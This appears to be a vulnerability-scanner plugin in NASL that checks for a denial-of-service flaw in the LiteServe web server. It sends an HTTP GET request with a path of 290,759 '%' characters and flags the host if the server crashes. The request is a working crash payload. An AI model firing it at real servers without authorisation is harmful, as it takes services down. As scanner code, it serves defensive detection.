if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11155" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_name( "LiteServe URL Decoding DoS" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your server or firewall it." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "The remote web server dies when an URL consisting of a
  long invalid string of % is sent." );
	script_tag( name: "impact", value: "A attacker may use this flaw to make your server crash continually." );
	script_tag( name: "affected", value: "LiteServe is affected. Webseal version 3.8 and other versions and products might
  be affected as well." );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
req = NASLString( "GET /", crap( data: "%", length: 290759 ), " HTTP/1.0\\r\\n\\r\\n" );
send( socket: soc, data: req );
r = http_recv( socket: soc );
close( soc );
sleep( 1 );
if(http_is_dead( port: port )){
	security_message( port );
}

